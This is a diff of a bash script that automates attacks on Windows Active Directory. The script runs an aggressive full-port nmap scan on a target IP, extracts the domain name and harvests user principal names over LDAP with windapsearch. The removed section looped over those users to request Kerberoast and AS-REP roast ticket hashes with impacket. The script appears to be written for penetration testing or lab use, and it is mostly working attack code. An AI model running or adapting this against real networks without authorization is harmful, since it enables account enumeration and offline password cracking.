@@ -1,15 +1,33 @@
 #!/bin/bash
 
-# Check for root privileges
+# Check if the script is run with sudo
 if [ "$EUID" -ne 0 ]; then
     echo "Please run this script with sudo privileges."
     exit 1
 fi
 
-# Prompt for the domain name
-read -p "Enter the domain name you found from nmap: " domain_name
+# Check if Nmap is installed, and if not, install it
+if ! command -v nmap &> /dev/null; then
+    echo "Nmap is not installed. Installing Nmap..."
+    apt install nmap -y
+    echo "Nmap installation completed."
+else
+    echo "Nmap is already installed."
+fi
 
-# Use windapsearch to get usernames from LDAP
+# Read the IP address from the user
+read -p "Enter the IP address to scan: " target_ip
+
+# Perform an Nmap scan and save the results to a file
+echo "Scanning $target_ip with Nmap..."
+nmap -A -T4 -Pn -p- -oN nmap_scan_results.txt $target_ip
+
+# Extract the domain name from the Nmap results, preserving case
+domain_name=$(grep -oP -m 1 "Domain: \K[^,]+" nmap_scan_results.txt)
+
+echo "Nmap scan completed. Results are saved in 'nmap_scan_results.txt'."
+echo "Domain name (dname): $domain_name"
+
 echo "Using windapsearch to get usernames from LDAP"
 
 # Run the windapsearch command with the constructed regex
@@ -17,7 +35,7 @@ echo "Using windapsearch to get usernames from LDAP"
 WINDAPSEARCH="./tools/windapsearch-linux-amd64"
 
 # Run windapsearch based on the domain_name variable
-$WINDAPSEARCH -d "$domain_name" -m users --filter | grep -o 'userPrincipalName: [^ ]*' | cut -d ' ' -f 2 > $domain_name-Users.txt
+$WINDAPSEARCH -d "$domain_name" -m users --filter | grep -o 'userPrincipalName: [^ ]*' | cut -d ' ' -f 2 > "$domain_name-Users.txt"
 echo "Usernames will be saved in a text file."
 
 # Color codes
@@ -44,32 +62,6 @@ elif [ "$answer" == "n" ] || [ "$answer" == "N" ]; then
 else
     # Handle invalid input
     echo "Invalid input. Please enter 'y' to proceed or 'n' to cancel."
-fi
-
-# Function to check and install Python package
-function check_python_package() {
-    if python -c "import $1" 2>/dev/null; then
-        echo "$1 is installed."
-    else
-        echo "$1 is not installed."
-        echo "Installing $1..."
-        pip install "$1"
-    fi
-}
-
-# Using impacket for kerberoasting
-USERS_FILE="$domain_name-Users.txt"
-
-# Check if the users file exists
-if [ -f "$USERS_FILE" ]; then
-  # Loop through the usernames in the file
-  while IFS= read -r username; do
-    # Run the script for each username
-    impacket-GetUserSPNs -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
-    impacket-GetNPUsers -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
-  done < "$USERS_FILE"
-else
-  echo "Usernames file $USERS_FILE not found."
 fi
 
 
